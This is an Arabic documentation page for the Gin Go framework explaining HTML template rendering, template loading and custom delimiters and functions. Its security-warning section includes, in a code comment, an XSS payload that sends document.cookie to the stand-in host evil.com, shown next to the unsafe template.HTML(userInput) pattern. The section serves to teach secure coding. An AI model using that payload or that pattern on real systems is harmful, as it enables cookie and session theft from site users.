---
title: "عرض HTML"
sidebar:
  order: 9
---

يستخدم Gin حزمة [html/template](https://pkg.go.dev/html/template) لعرض HTML.
لمزيد من المعلومات حول كيفية استخدامها، بما في ذلك العناصر النائبة المتاحة، راجع توثيق [text/template](https://pkg.go.dev/text/template)

استخدم LoadHTMLGlob() أو LoadHTMLFiles() لتحديد ملفات HTML المراد تحميلها.

```go
func main() {
  router := gin.Default()
  router.LoadHTMLGlob("templates/*")
  //router.LoadHTMLFiles("templates/template1.html", "templates/template2.html")
  router.GET("/index", func(c *gin.Context) {
    c.HTML(http.StatusOK, "index.tmpl", gin.H{
      "title": "Main website",
    })
  })
  router.Run(":8080")
}
```

templates/index.tmpl

```html
<html>
  <h1>
    {{ .title }}
  </h1>
</html>
```

استخدام قوالب بنفس الاسم في مجلدات مختلفة

```go
func main() {
  router := gin.Default()
  router.LoadHTMLGlob("templates/**/*")
  router.GET("/posts/index", func(c *gin.Context) {
    c.HTML(http.StatusOK, "posts/index.tmpl", gin.H{
      "title": "Posts",
    })
  })
  router.GET("/users/index", func(c *gin.Context) {
    c.HTML(http.StatusOK, "users/index.tmpl", gin.H{
      "title": "Users",
    })
  })
  router.Run(":8080")
}
```

**ملاحظة:** يرجى لف قالب HTML الخاص بك في كتلة `{{define <template-path>}} {{end}}` وتعريف ملف القالب بالمسار النسبي `<template-path>`. وإلا فلن يحلل Gin ملفات القوالب بشكل صحيح.

templates/posts/index.tmpl

```html
{{ define "posts/index.tmpl" }}
<html><h1>
  {{ .title }}
</h1>
<p>Using posts/index.tmpl</p>
</html>
{{ end }}
```

templates/users/index.tmpl

```html
{{ define "users/index.tmpl" }}
<html><h1>
  {{ .title }}
</h1>
<p>Using users/index.tmpl</p>
</html>
{{ end }}
```

### تحميل القوالب من http.FileSystem (الإصدار 1.11+)

إذا كانت قوالبك مضمّنة أو مقدمة بواسطة `http.FileSystem`، استخدم `LoadHTMLFS`:

```go
import (
  "embed"
  "io/fs"
  "net/http"
  "github.com/gin-gonic/gin"
)

//go:embed templates
var tmplFS embed.FS

func main() {
  r := gin.Default()
  sub, _ := fs.Sub(tmplFS, "templates")
  r.LoadHTMLFS(http.FS(sub), "**/*.tmpl")
  r.GET("/", func(c *gin.Context) {
    c.HTML(http.StatusOK, "index.tmpl", gin.H{"title": "From FS"})
  })
  r.Run(":8080")
}
```

### تحذير أمني: `template.HTML()` تتجاوز الترميز التلقائي

تقوم حزمة `html/template` في Go تلقائياً بترميز القيم المُدرجة في القوالب لمنع هجمات البرمجة عبر المواقع (XSS). ومع ذلك، عندما تحوّل سلسلة إلى `template.HTML()`، فأنت تتجاوز هذه الحماية صراحة. إذا كانت السلسلة تحتوي على مدخلات من المستخدم، يمكن للمهاجم حقن JavaScript عشوائي.

**غير آمن -- لا تستخدم أبداً `template.HTML()` مع مدخلات المستخدم:**

```go
// DANGEROUS: attacker controls userInput, which could be:
// <script>document.location='https://evil.com/?cookie='+document.cookie</script>
c.HTML(http.StatusOK, "page.tmpl", gin.H{
  "content": template.HTML(userInput), // XSS vulnerability!
})
```

**آمن -- دع محرك القوالب يُرمّز مدخلات المستخدم تلقائياً:**

```go
// SAFE: html/template will escape any HTML/JS in userInput
c.HTML(http.StatusOK, "page.tmpl", gin.H{
  "content": userInput, // auto-escaped by html/template
})
```

استخدم `template.HTML()` فقط للمحتوى الذي تتحكم فيه بالكامل، مثل مقتطفات HTML الثابتة المُعرّفة في الكود الخاص بك. لا تستخدمها أبداً مع قيم تأتي من مدخلات المستخدم أو حقول قاعدة البيانات المُعبأة بواسطة المستخدمين أو أي مصدر غير موثوق آخر.

### عارض قوالب مخصص

يمكنك أيضاً استخدام عارض قوالب HTML الخاص بك

```go
import "html/template"

func main() {
  router := gin.Default()
  html := template.Must(template.ParseFiles("file1", "file2"))
  router.SetHTMLTemplate(html)
  router.Run(":8080")
}
```

### محددات مخصصة

يمكنك استخدام محددات مخصصة

```go
  router := gin.Default()
  router.Delims("{[{", "}]}")
  router.LoadHTMLGlob("/path/to/templates")
```

### دوال قوالب مخصصة

راجع [الكود النموذجي](https://github.com/gin-gonic/examples/tree/master/template) التفصيلي.

main.go

```go
import (
    "fmt"
    "html/template"
    "net/http"
    "time"

    "github.com/gin-gonic/gin"
)

func formatAsDate(t time.Time) string {
    year, month, day := t.Date()
    return fmt.Sprintf("%d/%02d/%02d", year, month, day)
}

func main() {
    router := gin.Default()
    router.Delims("{[{", "}]}")
    router.SetFuncMap(template.FuncMap{
        "formatAsDate": formatAsDate,
    })
    router.LoadHTMLFiles("./testdata/template/raw.tmpl")

    router.GET("/raw", func(c *gin.Context) {
        c.HTML(http.StatusOK, "raw.tmpl", map[string]interface{}{
            "now": time.Date(2017, 07, 01, 0, 0, 0, 0, time.UTC),
        })
    })

    router.Run(":8080")
}

```

raw.tmpl

```sh
Date: {[{.now | formatAsDate}]}
```

النتيجة:

```sh
Date: 2017/07/01
```
